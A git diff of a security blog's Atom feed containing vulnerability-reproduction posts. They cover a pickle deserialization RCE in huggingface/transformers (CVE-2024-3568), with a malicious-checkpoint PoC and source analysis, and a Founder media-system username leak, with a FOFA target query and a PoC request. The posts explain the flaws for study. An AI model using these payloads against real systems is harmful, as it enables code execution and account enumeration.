&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; return os.system, (command,)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; poc = CommandExecute()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; with open(filepath, &amp;#x27;wb&amp;#x27;) as fp:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; pickle.dump(poc, fp)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;官⽅的修复似乎是把这个⽅法删除掉了？草没看明⽩…&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/huggingface/transformers/commit/693667b8ac8138b83f8adb6522ddaf42fa07c125&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+</content>
+        <category term="漏洞复现" />
+        <updated>2024-12-27T08:28:35.297Z</updated>
     </entry>
     <entry>
         <id>http://example.com/2024/11/12/natpass/</id>
@@ -609,275 +879,5 @@ config.ini、install.cmd、RmEye.exe、sysmon.xml、Sysmon64.exe&lt;br&gt;
 </content>
         <category term="漏洞复现" />
         <updated>2024-10-31T06:16:22.000Z</updated>
-    </entry>
-    <entry>
-        <id>http://example.com/2024/10/28/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8syn.do%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</id>
-        <title>方正全媒体采编系统存在syn.do信息泄露漏洞</title>
-        <link rel="alternate" href="http://example.com/2024/10/28/%E6%96%B9%E6%AD%A3%E5%85%A8%E5%AA%92%E4%BD%93%E9%87%87%E7%BC%96%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8syn.do%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
-        <content type="html">&lt;h1 id=&#34;方正全媒体采编系统存在syndo信息泄露漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#方正全媒体采编系统存在syndo信息泄露漏洞&#34;&gt;#&lt;/a&gt; 方正全媒体采编系统存在 syn.do 信息泄露漏洞&lt;/h1&gt;
-&lt;h2 id=&#34;1-漏洞介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-漏洞介绍&#34;&gt;#&lt;/a&gt; 1、漏洞介绍&lt;/h2&gt;
-&lt;p&gt;​	方正全媒体采编系统存在 syn.do 信息泄露漏洞，攻击者可以查看到平台中所有用户的用户名。&lt;/p&gt;
-&lt;h2 id=&#34;2-fofa语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-fofa语句&#34;&gt;#&lt;/a&gt; 2、 fofa 语句&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;app=&amp;quot;FOUNDER-全媒体采编系统&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;3-poc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-poc&#34;&gt;#&lt;/a&gt; 3、POC&lt;/h2&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;GET /newsedit/assess/syn.do?type=org HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 185Accept: */*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h2 id=&#34;4-验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-验证&#34;&gt;#&lt;/a&gt; 4、验证&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1724056279042-c14e8c27-b358-4e33-97da-1c74b71c8427.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-</content>
-        <category term="漏洞复现" />
-        <updated>2024-10-28T08:33:09.466Z</updated>
-    </entry>
-    <entry>
-        <id>http://example.com/2024/10/28/huggingfaceRCE/</id>
-        <title>huggingface/transformers RCE</title>
-        <link rel="alternate" href="http://example.com/2024/10/28/huggingfaceRCE/"/>
-        <content type="html">&lt;h1 id=&#34;huggingfacetransformers-rce漏洞分析-cve-2024-3568&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#huggingfacetransformers-rce漏洞分析-cve-2024-3568&#34;&gt;#&lt;/a&gt; huggingface/	transformers RCE 漏洞分析 （CVE-2024-3568）&lt;/h1&gt;
-&lt;h2 id=&#34;1-缘起&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-缘起&#34;&gt;#&lt;/a&gt; 1、缘起&lt;/h2&gt;
-&lt;p&gt;刚开始研究⼤模型安全的时候就看到 huggingface/transformers 有这个 load_repo_checkpoint 的漏洞，不过 当时看到说是利⽤起来⽐较困难就没有再深⼊研究（世上⽆难事，只要肯放弃），直到周五（2024-10-18）的时 候，看到各个技术群⾥都在转发字节跳动实习⽣对⼤模型投毒的聊天记录，故事情节相当精彩刺激，后来在知乎热 榜上也看到出现⾮常多的讨论，有兴趣的读者可⾃⾏吃⽠： &lt;a href=&#34;https://www.zhihu.com/question/1296528119&#34;&gt;字节跳动大模型训练被实习生恶意注入破坏代码，涉事者已被辞退，攻击带来的影响有多大？暴露出哪些问题？ - 知乎 (zhihu.com)&lt;/a&gt; 既然这个漏洞都已经能够在实际环境中产⽣危害了，感觉是有必要深⼊了解分析⼀下了&lt;/p&gt;
-&lt;h2 id=&#34;2-漏洞复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-漏洞复现&#34;&gt;#&lt;/a&gt; 2、漏洞复现&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;前置条件：&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;安装的是 4.38.0 或之前的 transformer&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;pip install transformers==4.37.2&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;code&gt; pip install tensorflow&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;借助这个⼯具来进⾏漏洞复现：&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;https://github.com/llm-sec/transformer-hacker&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;先⽣成⼀个带 checkpoint 的⽂件夹，执⾏的命令是 Mac 下的打开计算器命令：&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;python main.py --directory ./rce-checkpoint --model bert-base-uncased --command &#39;open  /System/Applications/Calculator.app&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/image-20241024155859447.png&#34; alt=&#34;image-20241024155859447&#34;&gt;&lt;/p&gt;
-&lt;p&gt;⽣成好了 payload 之后，然后执⾏下⾯的代码，⽤这段代码来模拟模型训练加载 加载⽣成的带有命令执⾏的 checkpoint 的仓库⽂件夹： checkpoint 的过程，在⾥⾯尝试：&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from tensorflow.keras.optimizers import Adam&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; from transformers import TFAutoModel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # 这个模型还是有些⼤的，下载可能会花⼀些时间...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # https://huggingface.co/google-bert/bert-base-uncased/tree/main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model = TFAutoModel.from_pretrained(&amp;#x27;bert-base-uncased&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model.compile(optimizer=Adam(learning_rate=5e-5), loss=&amp;#x27;sparse_categorical_crossentropy&amp;#x27;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;metrics=[&amp;#x27;accuracy&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # 把参数修改为checkpoint所在的仓库的路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;model.load_repo_checkpoint(&amp;#x27;test_repo&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;在被加载的时候就能够执⾏任意命令，但是这⾥我们只是为了证明能够执⾏⽽不想产⽣实际危害，所以我们只是弹 出了⼀个计算器：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/image-20241028101410376.png&#34; alt=&#34;image-20241028101410376&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;漏洞原理分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞原理分析&#34;&gt;#&lt;/a&gt; 漏洞原理分析&lt;/h2&gt;
-&lt;p&gt;从⼤的流程上来说，就是 transformers 允许从检查点恢复预训练的⼀些进度，⽽所谓的 checkpoint 检查点其实 就是⼀个⽂件夹，结构⼤概是这样⼦的：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/image-20241028101443835.png&#34; alt=&#34;image-20241028101443835&#34;&gt;&lt;/p&gt;
-&lt;p&gt;⽂件夹名称 checkpoint 是约定的固定的名称，下⾯的两个⽂件：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;weights.h5 ：模型的权重⽂件，必须要是跟正在使⽤的模型架构对应的的权重，否则的话加载权重这⼀步就 会抛异常，⾛不到执⾏命令那⼀步，所以利⽤时要知道使⽤的是哪个模型架构，因为不同的架构可能有不同的 神经⽹络层数之类的&lt;/li&gt;
-&lt;li&gt;extra_data.pickle ：这个⽂件的初衷是存放⼀些元数据信息，只是保存⽅式选择的⽅式选择得不太合适， 为了⽅便直接⽤ pickle.dump 来保存，输出的是⼀个序列化的⽂件，⽽模型加载的时候要读取对应的元数据 信息，就会使⽤ pickle.load (f) 来加载这个⽂件，从⽽利⽤反序列化漏洞进⾏ RCE。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;下⾯来看⼀下 poc 代码，追⼀下源代码看看漏洞到底是怎么产⽣的，可以看到是在 model.load_repo_checkpoint ⽅法读取了有问题的 checkpoint ：&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from tensorflow.keras.optimizers import Adam&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; from transformers import TFAutoModel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 这个模型还是有些⼤的，下载可能会花⼀些时间...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # https://huggingface.co/google-bert/bert-base-uncased/tree/main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model = TFAutoModel.from_pretrained(&amp;#x27;bert-base-uncased&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; model.compile(optimizer=Adam(learning_rate=5e-5), loss=&amp;#x27;sparse_categorical_crossentropy&amp;#x27;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;metrics=[&amp;#x27;accuracy&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # 把参数修改为checkpoint所在的仓库的路径，注意路径要正确&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;model.load_repo_checkpoint(&amp;#x27;rce-checkpoint&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;让我们跟进去代码看⼀下，这个⽅法完整的实现是下⾯这样⼦，可以看到逻辑⽐较简单，下⾯我们将⼀段⼀段的分 析它：&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def load_repo_checkpoint(self, repo_path_or_name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Loads a saved checkpoint (model weights and optimizer state) from a repo. Returns &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the current epoch count when&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  the checkpoint was made.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Args:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  repo_path_or_name (`str`):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Can either be a repository name for your &amp;#123;object&amp;#125; in the Hub or a path to &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a local folder (in which case&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  the repository will have the name of that local folder).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Returns:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            `dict`: A dictionary of extra metadata from the checkpoint, most commonly an &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;epoch&amp;quot; count.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if getattr(self, &amp;quot;optimizer&amp;quot;, None) is None:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise RuntimeError(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;quot;Checkpoint loading failed as no optimizer is attached to the model. &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;quot;This is most likely caused by the model not being compiled.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if os.path.isdir(repo_path_or_name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo_path_or_name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            # If this isn&amp;#x27;t a local path, check that the remote repo exists and has a &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint in it&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo_files = list_repo_files(repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            for file in (&amp;quot;checkpoint/weights.h5&amp;quot;, &amp;quot;checkpoint/extra_data.pickle&amp;quot;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                if file not in repo_files:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    raise FileNotFoundError(f&amp;quot;Repo &amp;#123;repo_path_or_name&amp;#125; does not contain &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint file &amp;#123;file&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo = Repository(repo_path_or_name.split(&amp;quot;/&amp;quot;)[-1], &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clone_from=repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo.local_dir&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Now make sure the repo actually has a checkpoint in it.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        checkpoint_dir = os.path.join(local_dir, &amp;quot;checkpoint&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        weights_file = os.path.join(checkpoint_dir, &amp;quot;weights.h5&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(weights_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file weights.h5 in repo &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        extra_data_file = os.path.join(checkpoint_dir, &amp;quot;extra_data.pickle&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(extra_data_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file extra_data.pickle in &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;repo &amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Assuming the repo is real and we got a checkpoint, load the weights and the &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;optimizer state into the model.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # The optimizer state includes the iteration count, so learning rate schedules &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;should resume as normal too.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.load_weights(weights_file)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        with open(extra_data_file, &amp;quot;rb&amp;quot;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            extra_data = pickle.load(f)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.optimizer.set_weights(extra_data[&amp;quot;optimizer_state&amp;quot;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Finally, return the epoch number from the checkpoint. This isn&amp;#x27;t a property of &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the model, so we can&amp;#x27;t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # set it directly, but the user can pass it to fit().&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return &amp;#123;&amp;quot;epoch&amp;quot;: extra_data[&amp;quot;epoch&amp;quot;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;⾸先这部分是对模型⾃身的设置进⾏检查，这就要求模型使⽤的时候必须要配置了 optimizer：&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;if getattr(self, &amp;quot;optimizer&amp;quot;, None) is None:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          raise RuntimeError(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;quot;Checkpoint loading failed as no optimizer is attached to the model. &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;quot;This is most likely caused by the model not being compiled.&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;所以我们的 poc 代码⾥也为模型配置了 optimizer：&lt;/p&gt;
